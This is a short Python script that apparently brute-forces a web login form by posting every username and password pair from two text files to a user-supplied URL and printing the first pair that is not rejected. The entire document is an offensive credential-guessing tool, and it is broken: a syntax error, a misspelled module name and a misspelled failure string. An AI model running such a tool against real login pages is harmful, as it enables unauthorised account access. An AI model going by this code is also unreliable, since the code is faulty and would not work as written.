import requests

url = input("IP or URl: ")

with open ("users.txt") as f:
	users = [u.strip() for u in f if u.strip()]

with open ("passwords.txt") as f:
	passwords = [p.strip() for p in f if p.strip()]

for username in users:
	for password in passwords:
		data{
			"username":username,
			"password":password
		}
		resp = resquests.post(url, data=data)

		if "Ivalid Credentials" not in resp.text:
			print(f"[+] Success: {username}:{password}")
			print(resp.text[:300])
			exit()
		else:
			print(f"[-] Failure: {username}:{password}")
print ("[-] No matches!")